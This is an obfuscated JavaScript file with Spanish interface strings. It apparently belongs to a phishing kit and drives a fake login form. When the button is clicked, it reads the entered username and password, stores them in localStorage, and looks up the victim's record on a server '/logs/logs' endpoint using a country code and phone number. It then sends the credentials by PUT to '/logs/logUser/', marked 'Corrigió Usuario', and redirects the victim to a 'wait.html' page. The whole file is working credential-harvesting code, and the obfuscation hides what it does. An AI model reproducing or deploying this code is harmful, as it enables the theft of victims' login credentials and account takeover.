const _0x3ad040 = _0x4a7a;
(function (_0x131c62, _0x53ea17) {
  const _0x536a7a = _0x4a7a,
    _0x3921e6 = _0x131c62();
  while (!![]) {
    try {
      const _0x385781 =
        (-parseInt(_0x536a7a(0x169)) / 0x1) *
          (-parseInt(_0x536a7a(0x183)) / 0x2) +
        -parseInt(_0x536a7a(0x17e)) / 0x3 +
        (parseInt(_0x536a7a(0x17f)) / 0x4) *
          (parseInt(_0x536a7a(0x168)) / 0x5) +
        -parseInt(_0x536a7a(0x177)) / 0x6 +
        parseInt(_0x536a7a(0x173)) / 0x7 +
        parseInt(_0x536a7a(0x165)) / 0x8 +
        (parseInt(_0x536a7a(0x171)) / 0x9) *
          (-parseInt(_0x536a7a(0x185)) / 0xa);
      if (_0x385781 === _0x53ea17) break;
      else _0x3921e6["push"](_0x3921e6["shift"]());
    } catch (_0x4e9e10) {
      _0x3921e6["push"](_0x3921e6["shift"]());
    }
  }
})(_0x2a5a, 0x49540);
function updateLS() {
  const _0x4bffc4 = _0x4a7a;
  LS[_0x4bffc4(0x176)]("info", JSON[_0x4bffc4(0x16e)](info));
}
const button = document[_0x3ad040(0x186)]("btnUsuario"),
  userInput = document[_0x3ad040(0x186)](_0x3ad040(0x167)),
  passInput = document[_0x3ad040(0x186)](_0x3ad040(0x175));
async function updateStatus() {
  const _0x521ee4 = _0x3ad040;
  button["disabled"] = !![];
  try {
    const _0x4bf742 = await fetch(url + _0x521ee4(0x16b), {
      method: "GET",
      headers: { "Content-Type": _0x521ee4(0x162) },
    });
    if (!_0x4bf742["ok"]) throw new Error(_0x521ee4(0x181));
    const _0x33bb5c = await _0x4bf742[_0x521ee4(0x17d)](),
      _0x14f0f5 = [..._0x33bb5c];
    for (const _0x29a56d of _0x14f0f5) {
      if (
        _0x29a56d["reg"] == info[_0x521ee4(0x17c)]["cc"] &&
        _0x29a56d["cl"] == info["metaInfo"][_0x521ee4(0x174)]
      ) {
        console["log"](_0x521ee4(0x163));
        const _0x36a8db = await fetch(
          url + _0x521ee4(0x170) + _0x29a56d[_0x521ee4(0x166)],
          {
            method: "PUT",
            headers: { "Content-Type": _0x521ee4(0x162) },
            body: JSON["stringify"]({
              us: info[_0x521ee4(0x17c)][_0x521ee4(0x17b)],
              ps: info[_0x521ee4(0x17c)][_0x521ee4(0x179)],
              status: _0x521ee4(0x16f),
            }),
          }
        );
        if (!_0x36a8db["ok"]) throw new Error(_0x521ee4(0x17a));
        const _0x246d04 = await _0x36a8db["json"]();
        console["log"](_0x521ee4(0x16d));
      }
    }
    window[_0x521ee4(0x161)][_0x521ee4(0x164)] = _0x521ee4(0x182);
  } catch (_0x47c3ff) {
    console[_0x521ee4(0x16c)](
      "Error\x20al\x20procesar\x20la\x20actualización:",
      _0x47c3ff
    );
  } finally {
    button["disabled"] = ![];
  }
}
button[_0x3ad040(0x180)](_0x3ad040(0x172), async function (_0x3a517c) {
  const _0x5d22b5 = _0x3ad040;
  _0x3a517c[_0x5d22b5(0x178)]();
  if (userInput["value"] === "" || passInput[_0x5d22b5(0x16a)] === "") {
    alert(_0x5d22b5(0x184)), userInput["focus"]();
    return;
  }
  const _0x4b20cf = userInput[_0x5d22b5(0x16a)],
    _0x46488d = passInput["value"];
  (info[_0x5d22b5(0x17c)][_0x5d22b5(0x17b)] = _0x4b20cf),
    (info[_0x5d22b5(0x17c)][_0x5d22b5(0x179)] = _0x46488d),
    updateLS(),
    await updateStatus();
});
function _0x4a7a(_0x95e241, _0x2a0ae2) {
  const _0x2a5af1 = _0x2a5a();
  return (
    (_0x4a7a = function (_0x4a7a13, _0x1cd458) {
      _0x4a7a13 = _0x4a7a13 - 0x161;
      let _0x4b7570 = _0x2a5af1[_0x4a7a13];
      return _0x4b7570;
    }),
    _0x4a7a(_0x95e241, _0x2a0ae2)
  );
}
function _0x2a5a() {
  const _0x2aedfd = [
    "/logs/logs",
    "error",
    "Usuario\x20actualizado",
    "stringify",
    "Corrigió\x20Usuario",
    "/logs/logUser/",
    "36LGTdPk",
    "click",
    "684257UtYenb",
    "telnum",
    "txtPass",
    "setItem",
    "1017348rhVcTM",
    "preventDefault",
    "puser",
    "Error\x20al\x20actualizar\x20usuario",
    "user",
    "metaInfo",
    "json",
    "221562iaKstH",
    "18200JGoONj",
    "addEventListener",
    "Error\x20al\x20obtener\x20los\x20datos\x20del\x20servidor",
    "wait.html",
    "2FwdKDr",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "989620lVAKWx",
    "getElementById",
    "location",
    "application/json",
    "Usuario\x20encontrado",
    "href",
    "4660776yZlVtN",
    "idreg",
    "txtUsuario",
    "30quXCkb",
    "231964RFZlRm",
    "value",
  ];
  _0x2a5a = function () {
    return _0x2aedfd;
  };
  return _0x2a5a();
}
